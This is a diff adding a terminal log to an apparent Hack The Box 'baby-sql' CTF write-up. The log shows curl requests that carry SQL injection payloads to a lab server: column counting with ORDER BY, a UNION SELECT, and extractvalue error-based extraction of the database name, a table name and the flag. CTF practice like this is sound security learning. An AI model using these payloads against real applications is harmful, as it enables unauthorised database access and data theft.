@@ -67,5 +67,64 @@ SELECT * FROM users WHERE password=('shit'') AND username=('admin')
 php > 
 ```
 
+```bash
+curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$'"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=admin%1$'"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1   
 
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1#"
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1--"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=admin%1$'#"    
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1--"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 1#" 
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 2#"
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') ORDER BY 3#"
+Unknown column '3' in 'order clause'                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# nvim exploit.py                            
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') extractvalue(0x0a,concat(0x0a,(select database())))--#"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'extractvalue(0x0a,concat(0x0a,(select database())))--#') AND username=('admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))--#"
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))#"  
+XPATH syntax error: '
+db_m412'                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') extractvalue(0x0a,concat(0x0a,(select database())))#"  
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'extractvalue(0x0a,concat(0x0a,(select database())))#') AND username=('admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select database())))#"
+XPATH syntax error: '
+db_m412'                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1))))#"  
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')#') AND username=('admin')' at line 1                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#" 
+XPATH syntax error: '
+totally_not_a_flag'                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/baby-sql]
+└─# curl -XPOST http://165.22.121.146:32606/ -d "pass=%1$') UNION SELECT 1, extractvalue(0x0a,concat(0x0a,(select * from totally_not_a_flag)))#"
+XPATH syntax error: '
+HTB{h0w_d1d_y0u_f1nd_m3?}'                       
 
+```
